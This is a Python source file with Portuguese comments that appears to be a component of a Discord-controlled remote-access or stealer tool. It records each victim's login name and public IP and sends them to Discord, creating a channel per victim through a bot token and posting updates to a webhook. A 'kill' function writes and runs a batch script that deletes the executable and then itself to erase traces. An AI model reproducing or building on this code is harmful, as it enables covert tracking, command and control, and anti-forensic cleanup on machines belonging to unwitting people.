import requests
from dotenv import load_dotenv
import os
import subprocess
import sys

load_dotenv()

url_mv = os.getenv('webhook_url_mv')
url_mm = os.getenv('webhook_url_mm')
url_hhh = os.getenv('webhook_url_hhh')
token_dc = os.getenv('token_dc')
guild_id = os.getenv('guild_id')

# Função para enviar notificações
def send(mensagem):
    payload = {
        'content': mensagem
    }
    response = requests.post(url_hhh, json=payload)
    return response

def identificar_usuario():
    ip_publico = requests.get('https://httpbin.org/ip').json()['origin']
    usuario = os.getlogin()
    user_identification = f'{usuario} - {ip_publico}'.lower().replace('.', '').replace(' ', '')
    return user_identification

def criar_canal():
    user_identification = identificar_usuario()

    criar_canal = {
        "name": user_identification,
        "type": 0,

    }

    headers = {
        "Authorization": f"Bot {token_dc}",
        "Content-Type": "application/json"
    }  

    # Cria Novo Canal no Discord para cada usuario
    response = requests.post(f'https://discord.com/api/guilds/{guild_id}/channels', json=criar_canal, headers=headers)

    if response.status_code == 201:
        send(f"Canal {response.json()['name']} criado com sucesso!")
    else:
        send(f"Erro ao criar canal: {response.status_code} - {response.json()}")


def kill(diretorio_arquivo):
    send('Iniciando KILL')
    exe_path = sys.executable  # caminho do exe atual
    bat_path = os.path.join(diretorio_arquivo, 'del_self.bat')

    with open(bat_path, 'w') as f:
        f.write(f'''
@echo off
:loop
tasklist /fi "imagename eq {os.path.basename(exe_path)}" | find /i "{os.path.basename(exe_path)}" >nul
if not errorlevel 1 (
    timeout /t 1 /nobreak >nul
    goto loop
)
del "{exe_path}"
del "%~f0"
''')

    # executa o bat em background
    subprocess.Popen(['cmd', '/c', bat_path], shell=False)

    send('KILL Finalizado')

    os._exit(0)